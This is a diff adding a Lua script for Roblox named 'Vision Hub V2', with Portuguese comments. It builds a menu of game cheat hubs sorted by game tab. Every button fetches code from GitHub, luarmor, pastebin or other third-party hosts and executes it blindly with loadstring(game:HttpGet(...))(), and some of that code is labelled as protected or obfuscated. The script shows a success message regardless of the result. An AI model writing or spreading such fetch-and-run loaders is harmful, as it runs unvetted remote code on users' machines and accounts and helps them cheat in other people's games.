@@ -1,0 +1,1426 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({
+    Name = "Vision Hub V2",  -- Nome exibido na janela e introdução
+    HidePremium = false,    -- Esconder funções premium (false para exibi-las)
+    SaveConfig = true,      -- Salvar as configurações automaticamente
+    ConfigFolder = "Vision Hub V2",  -- Pasta onde as configurações serão salvas
+    IntroEnabled = true,    -- Ativar introdução ao abrir
+    IntroText = "Vision Hub V2", -- Texto exibido na introdução
+    IntroIcon = "rbxassetid://127694712584422"  -- ID do ícone mostrado na introdução
+})
+
+-- Criando a aba Fisch
+local FischTab = Window:MakeTab({
+    Name = "Fisch",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Fisch
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Fisch
+local FischSection = FischTab:AddSection({
+    Name = "Seção Fisch"
+})
+
+-- Criando os botões na aba Fisch
+FischTab:AddButton({
+    Name = "God Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Speed Hub (Recomendado)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Solix Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))() 
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Mercury Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c019f214a19894b50f0b8e817b70d25f.lua"))() 
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Naoki Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://naokihub.vercel.app", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Nil Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2c5f110f91165707959fc626b167e036.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "KNCRYPT Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/Fisch.lua", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Cupink Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://you.whimper.xyz/sources/CupPink/fisch.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+FischTab:AddButton({
+    Name = "Romix Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fcbdda745da39b237faf2766f6d8d9cb.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+
+
+-- Criando a aba Blox-Fruits
+local BloxFruitsTab = Window:MakeTab({
+    Name = "Blox-Fruits",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Blox-Fruits
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Blox-Fruits
+local BloxFruitsSection = BloxFruitsTab:AddSection({
+    Name = "Seção Blox-Fruits"
+})
+
+-- Criando os botões na aba Blox-Fruits
+BloxFruitsTab:AddButton({
+    Name = "ThurdenZ Hub",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/Loader/AllGame.lua'))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "Redz Hub (Recomendado)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "W-azure (Recomendado)",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "Alchemy Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "Moon Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/MoonHub", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+-- Criando os botões na aba Blox-Fruits
+BloxFruitsTab:AddButton({
+    Name = "Yumiara Hub",
+    Callback = function()
+        loadstring(game.HttpGet(game,'https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/BloxFruit-XYZ.lua'))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "HOHO Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "Xero Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/verudous/Xero-Hub/refs/heads/main/main.lua"))() 
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BloxFruitsTab:AddButton({
+    Name = "Speed Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+}) 
+
+-- Criando a aba Blade-Ball
+local BladeBallTab = Window:MakeTab({
+    Name = "Blade-Ball",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Blade-Ball
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Blade-Ball
+local BladeBallSection = BladeBallTab:AddSection({
+    Name = "Seção Blade-Ball"
+})
+
+-- Criando os botões na aba Blade-Ball
+BladeBallTab:AddButton({
+    Name = "Bakuga Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/Bakugan/refs/heads/main/Bakugan.lua", true))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BladeBallTab:AddButton({
+    Name = "Fsploit Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Flux-Z-Beta/refs/heads/main/Flux-Z-Beta-Blade-Ball.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+BladeBallTab:AddButton({
+    Name = "Waver Hub ",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JoshSheesh/Waver-Full-Script/refs/heads/main/Protected_7926735646342814.txt"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+
+-- Criando a aba Pet-Simulator
+local PetSimulatorTab = Window:MakeTab({
+    Name = "Pet-Simulator",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Pet-Simulator
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Pet-Simulator
+local PetSimulatorSection = PetSimulatorTab:AddSection({
+    Name = "Seção Pet-Simulator"
+})
+
+-- Criando os botões na aba Pet-Simulator
+PetSimulatorTab:AddButton({
+    Name = " Kitty Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BludnyHolandan/PS99/main/v3/autofarm/lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+-- Criando os botões na aba PetSimulator
+PetSimulatorTab:AddButton({
+    Name = "Hunter Hub (Mobile/Emulador)",
+    Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/SkaiScripts/Huge-Hunter/refs/heads/main/Ps99.lua"))()  
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+--Criando os botões na aba PetSimulator
+PetSimulatorTab:AddButton({
+    Name = "Admin Hub (Mobile/Emulador)",
+    Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/4hmadV99/Admin-Script/refs/heads/main/Pets%20Spawner.txt"))()  
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",  -- Você pode mudar a imagem se quiser
+            Time = 5
+        })
+    end
+})
+
+
+-- Criando a aba Murder-Mystery
+local MurderMysteryTab = Window:MakeTab({
+    Name = "Murder-Mystery",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Murder-Mystery
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Murder-Mystery
+local MurderMysterySection = MurderMysteryTab:AddSection({
+    Name = "Seção Murder-Mystery"
+})
+
+-- Criando os botões na aba Murder-Mystery
+MurderMysteryTab:AddButton({
+    Name = "Overdrive Hub (Mobile/Emulador)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlast/MM2/refs/heads/main/XHub"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Doors
+local DoorsTab = Window:MakeTab({
+    Name = "Doors",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Doors
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Doors
+local DoorsSection = DoorsTab:AddSection({
+    Name = "Seção Doors"
+})
+
+-- Criando os botões na aba Doors
+DoorsTab:AddButton({
+    Name = "King Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+DoorsTab:AddButton({
+    Name = "Misp Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba BlueLock-Rivals
+local BlueLockRivalsTab = Window:MakeTab({
+    Name = "BlueLock-Rivals",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba BlueLock-Rivals
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba BlueLock-Rivals
+local BlueLockRivalsSection = BlueLockRivalsTab:AddSection({
+    Name = "Seção BlueLock-Rivals"
+})
+
+-- Criando os botões na aba BlueLock-Rivals
+BlueLockRivalsTab:AddButton({
+    Name = "NS Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/fo/refs/heads/main/ot"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Pets Go
+local PetsGoTab = Window:MakeTab({
+    Name = "Pets Go",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Pets Go
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Pets Go
+local PetsGoSection = PetsGoTab:AddSection({
+    Name = "Seção Pets Go"
+})
+
+-- Criando os botões na aba Pets Go
+PetsGoTab:AddButton({
+    Name = "Speed Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mzkv/petsGO/refs/heads/main/xhub"))()  
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Jujutsu-Infinite
+local JujutsuInfiniteTab = Window:MakeTab({
+    Name = "Jujutsu-Infinite",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Jujutsu-Infinite
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba JujutsuInfinite
+local JujutsuInfiniteSection = JujutsuInfiniteTab:AddSection({
+    Name = "Seção Jujutsu-Infinite"
+})
+
+-- Criando os botões na aba Jujutsu-Infinite
+JujutsuInfiniteTab:AddButton({
+    Name = "Solix Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))() 
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando os botões na aba Jujutsu-Infinite
+JujutsuInfiniteTab:AddButton({
+    Name = "Vintu Hub",
+    Callback = function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/f9caf82bff389f078eb1641ac0c0c131.lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando os botões na aba Jujutsu-Infinite
+JujutsuInfiniteTab:AddButton({
+    Name = "Solix Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))() 
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Squid-Game
+local SquidGameTab = Window:MakeTab({
+    Name = "Squid-Game",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Squid-Game
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Squid-Game
+local SquidGameSection = SquidGameTab:AddSection({
+    Name = "Seção Squid-Game"
+})
+
+-- Criando os botões na aba Squid-Game
+SquidGameTab:AddButton({
+    Name = "Squid Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/4R4mpageHub/refs/heads/main/squidgamex"))();
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Squid-Game
+local MadCityTab = Window:MakeTab({
+    Name = "MadCity",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Squid-Game
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Squid-Game
+local MadCitySection = MadCityTab:AddSection({
+    Name = "Seção Mad-City"
+})
+
+-- Criando os botões na aba Squid-Game
+MadCityTab:AddButton({
+    Name = "MadCity Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githaubusercontent.com/castyhwprivateez/v1.6666666-w..ww..what-/main/Protected%20(46).lua"))()
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "O script foi executado com sucesso.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+    end
+})
+
+-- Criando a aba Squid-Game
+local RarityFactoryTab = Window:MakeTab({
+    Name = "Rarity-Factory",
+    Icon = "rbxassetid://126633428869869",  -- Ícone para a aba Squid-Game
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Squid-Game
+local RarityFactorySection = RarityFactoryTab:AddSection({
+    Name = "Seção RarityFactory"
+})
+
+-- Botão para executar o script do Nau Hub
+RarityFactoryTab:AddButton({
+    Name = "Nau Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/naufalafif080419/NauHubLoadstring/main/Loadstring.lua'))()
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Westbound
+local WestboundTab = Window:MakeTab({
+    Name = "Westbound",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Westbound
+local WestboundSection = WestboundTab:AddSection({
+    Name = "Seção Westbound"
+})
+
+-- Corrigindo o botão Westbound Pro
+WestboundTab:AddButton({
+    Name = "Westbound Pro",
+    Callback = function()
+        -- Executando o script do Westbound Pro
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/westbound.pro-Utilites/main/Main.lua"))()
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Executado",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  
+        })
+    end    
+})
+
+-- Criando a aba para Anime Simulator
+local AnimeSimulatorTab = Window:MakeTab({
+    Name = "Anime Simulator",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba Anime Simulator
+AnimeSimulatorSection = AnimeSimulatorTab:AddSection({
+    Name = "Anime Simulator"
+})
+
+-- Adicionando o botão para executar o script LyzerHub
+AnimeSimulatorTab:AddButton({
+    Name = "LyzerHub",
+    Callback = function()
+        -- Executa o script do Anime Simulator
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazeruy/LyzerHub/main/ScriptMain"))()
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Anime Simulator",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+-- Criando a aba para Car Race Simulator
+local CarRaceSimulatorTab = Window:MakeTab({
+    Name = "Car Race Simulator",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Car Race Simulator
+CarRaceSimulatorSection = CarRaceSimulatorTab:AddSection({
+    Name = "Car Race Simulator"
+})
+
+-- Botão para executar o script Car Race Simulator
+CarRaceSimulatorTab:AddButton({
+    Name = "Tora IsMe",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/CarRace"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Tora IsMe",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Shadow Boxing Battles
+local ShadowBoxingBattlesTab = Window:MakeTab({
+    Name = "Shadow Boxing Battles",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Shadow Boxing Battles
+ShadowBoxingBattlesSection = ShadowBoxingBattlesTab:AddSection({
+    Name = "Shadow Boxing Battles"
+})
+
+-- Botão para executar o script Flare Hub
+ShadowBoxingBattlesTab:AddButton({
+    Name = "Flare Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/imwifi/1FO/main/main.lua"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Stud Jump Obby
+local StudJumpObbyTab = Window:MakeTab({
+    Name = "Stud Jump Obby",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Stud Jump Obby
+StudJumpObbySection = StudJumpObbyTab:AddSection({
+    Name = "Stud Jump Obby"
+})
+
+-- Botão para executar o script Stud Jump Obby
+StudJumpObbyTab:AddButton({
+    Name = "Stud Jump Obby",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/imwifi/1FO/main/main.lua"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Raise a Floppa 2
+local RaiseAFloppa2Tab = Window:MakeTab({
+    Name = "Raise a Floppa 2",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Raise a Floppa 2
+RaiseAFloppa2Section = RaiseAFloppa2Tab:AddSection({
+    Name = "Raise a Floppa 2"
+})
+
+-- Botão para executar o script Raise a Floppa 2
+RaiseAFloppa2Tab:AddButton({
+    Name = "Floppa 2",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Raise-A-Floppa-2/main/Gui'))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Adopt Me
+local AdoptMeTab = Window:MakeTab({
+    Name = "Adopt Me",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Adopt Me
+AdoptMeSection = AdoptMeTab:AddSection({
+    Name = "Adopt Me"
+})
+
+-- Botão para executar o script QHub
+AdoptMeTab:AddButton({
+    Name = "QHub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet(("https://pastebin.com/raw/FuUNK9Lf"), true))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Shindo Life
+local ShindoLifeTab = Window:MakeTab({
+    Name = "Shindo Life",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Shindo Life
+ShindoLifeSection = ShindoLifeTab:AddSection({
+    Name = "Shindo Life"
+})
+
+-- Botão para executar o script Project Nexus
+ShindoLifeTab:AddButton({
+    Name = "Project Nexus",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/IkkyyDF/ProjectNexus/main/Loader.lua"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Tower Defense Simulator
+local TowerDefenseSimulatorTab = Window:MakeTab({
+    Name = "Tower Defense Simulator",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Tower Defense Simulator
+TowerDefenseSimulatorSection = TowerDefenseSimulatorTab:AddSection({
+    Name = "Tower Defense Simulator"
+})
+
+-- Botão para executar o script Tower Defense Simulator
+TowerDefenseSimulatorTab:AddButton({
+    Name = "Tower Defense Simulator",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://banbus.cf/scripts/autofarmconfig"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Flee The Facility
+local FleeTheFacilityTab = Window:MakeTab({
+    Name = "Flee the Facility",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba Flee the Facility
+FleeTheFacilitySection = FleeTheFacilityTab:AddSection({
+    Name = "Flee the Facility"
+})
+
+-- Botão para executar o script YARHM
+FleeTheFacilityTab:AddButton({
+    Name = "YARHM",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Universal Admin
+local UniversalAdminTab = Window:MakeTab({
+    Name = "Universal Admin",
+    Icon = "rbxassetid://85398723149532", -- Ícone da aba
+    PremiumOnly = false
+})
+
+-- Adicionando uma seção para o script Universal Admin
+UniversalAdminSection = UniversalAdminTab:AddSection({
+    Name = "Universal Admin"
+})
+
+-- Adicionando o botão para executar o script Universal Admin
+UniversalAdminTab:AddButton({
+    Name = "Universal Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
+        OrionLib:MakeNotification({
+            Name = "Universal Admin",
+            Content = "O script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998", -- Ícone da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para A Sols Rng
+local TypeorDieTab = Window:MakeTab({
+    Name = "Type or Die",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local TypeorDieTab = TypeorDieTab:AddSection({
+    Name = "Type or Die"
+})
+
+-- Botão para executar o script Slap Battles
+TypeorDieTab:AddButton({
+    Name = "Type or Die",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet('https://pastebin.com/raw/A6H1KMFp'))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
